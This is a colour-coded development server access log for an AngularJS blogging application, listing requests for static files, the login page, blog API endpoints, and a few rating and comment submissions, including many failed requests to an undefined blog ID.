[0mGET /common/nav/navigation.js [36m304 [0m4.978 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m5.046 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m5.125 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.531 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.510 ms - -[0m
[0mGET /api/blogs/undefined [33m400 [0m0.897 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.884 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.997 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.970 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.943 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.876 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.746 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.071 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.961 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.933 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.922 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.053 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.161 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.899 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.171 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.604 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.866 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.863 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.583 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.234 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.002 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.530 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.126 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.961 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.984 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.274 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.934 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.058 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.714 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.097 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.196 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.179 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.151 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.864 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.963 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.854 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.983 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.098 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.305 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.312 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.915 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.551 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.115 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.742 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.094 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.889 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.093 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.344 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.050 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.138 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.169 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.097 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.341 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.184 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.119 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.981 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m2.361 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.977 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.956 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.068 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.300 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m1.216 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.861 ms - 243[0m
[0mGET /api/blogs/undefined [33m400 [0m0.886 ms - 243[0m
[0mGET /login [36m304 [0m0.703 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.725 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.613 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.716 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.326 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.070 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.074 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.317 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m1.286 ms - 9174[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.857 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.626 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m5.313 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.649 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m4.534 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.560 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.104 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.655 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m6.241 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m6.690 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m6.264 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.866 ms - -[0m
[0mGET /login [32m200 [0m1.020 ms - 11155[0m
[0mGET /stylesheets/style.css [36m304 [0m1.229 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.972 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.711 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.745 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.550 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m2.928 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m3.383 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m3.516 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.630 ms - -[0m
[0mGET /login [36m304 [0m1.422 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.492 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.348 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.313 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m3.828 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m4.438 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m4.734 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.490 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.430 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.051 ms - -[0m
[0mGET /api/blogs [36m304 [0m6.031 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.827 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m5.056 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.793 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.949 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.067 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.552 ms - -[0m
[0mGET /login [36m304 [0m0.818 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.371 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.534 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.388 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.446 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.319 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.329 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.657 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m2.330 ms - 9179[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.797 ms - -[0m
[0mGET /login [36m304 [0m0.751 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.740 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.761 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.115 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.762 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.706 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.182 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.535 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.808 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.649 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.625 ms - -[0m
[0mGET /login [32m200 [0m0.931 ms - 11156[0m
[0mGET /stylesheets/style.css [36m304 [0m0.747 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.612 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.406 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.449 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.566 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.829 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m1.479 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.807 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.935 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.820 ms - -[0m
[0mGET /api/blogs [36m304 [0m6.285 ms - -[0m
[0mGET /login [36m304 [0m1.365 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.077 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.593 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.382 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.043 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.815 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m0.655 ms - 8831[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.562 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.560 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.089 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.707 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.063 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.082 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.610 ms - -[0m
[0mGET /api/blogs [36m304 [0m8.355 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.795 ms - -[0m
[0mGET / [32m200 [0m1.218 ms - 11156[0m
[0mGET /login [36m304 [0m1.745 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.696 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.227 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.618 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.480 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.412 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.430 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.497 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m1.747 ms - 11319[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.508 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m9.804 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.697 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.748 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.917 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.988 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.261 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.557 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.711 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.902 ms - -[0m
[0mGET /login [36m304 [0m0.897 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.423 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.305 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.977 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.220 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.617 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.026 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.202 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m1.649 ms - 11318[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.391 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.219 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.624 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.841 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.201 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.506 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.368 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.247 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.729 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.732 ms - -[0m
[0mGET /login [32m200 [0m0.826 ms - 11156[0m
[0mGET /stylesheets/style.css [36m304 [0m0.350 ms - -[0m
[0mGET /common/nav/navigation.js [32m200 [0m1.442 ms - 823[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.518 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m2.534 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m2.500 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.238 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m2.074 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m1.848 ms - 11318[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.594 ms - -[0m
[0mGET /favicon.ico [32m200 [0m1.322 ms - 11156[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.646 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.966 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.309 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.168 ms - -[0m
[0mGET /api/blogs [32m200 [0m3.463 ms - 782[0m
[0mGET /favicon.ico [36m304 [0m0.752 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.838 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.508 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.356 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.636 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m3.756 ms - 247[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.697 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.783 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.562 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.352 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.348 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.781 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.473 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.514 ms - -[0m
[0mPOST /api/blogs/6615c3d6c9d3b5533ecb8074/rating [32m200 [0m7.425 ms - 247[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m3.035 ms - 247[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m2.185 ms - 247[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.876 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.579 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.205 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.550 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.326 ms - -[0m
[0mPOST /api/blogs/6615c3d6c9d3b5533ecb8074/rating [32m200 [0m5.723 ms - 247[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m3.405 ms - 247[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.426 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m3.392 ms - 247[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.514 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.392 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.713 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.365 ms - -[0m
[0mPOST /api/blogs/6615c3d6c9d3b5533ecb8074/comments [32m200 [0m16.158 ms - 377[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m3.645 ms - 377[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m2.721 ms - 377[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.521 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.365 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.630 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.842 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.682 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.226 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.564 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.997 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.635 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.776 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.752 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.424 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.266 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.549 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.896 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.799 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.279 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.935 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.560 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.892 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.344 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.823 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.830 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.532 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.537 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.129 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.028 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.649 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.876 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.640 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.187 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.427 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.625 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.520 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.807 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.409 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.647 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.652 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.474 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.750 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.791 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.458 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.415 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.628 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.705 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.268 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.521 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.794 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.003 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.297 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.790 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.689 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.182 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.063 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.131 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.712 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.097 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.629 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.441 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.342 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.134 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.575 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.060 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.543 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.521 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.331 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.442 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.677 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.372 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.981 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.293 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.294 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.673 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.496 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.230 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.649 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m8.018 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m31.074 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.635 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.843 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.998 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.916 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.175 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.370 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.070 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.007 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.445 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m17.969 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.391 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.599 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.985 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.627 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.212 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.709 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.723 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.292 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.748 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.606 ms - -[0m
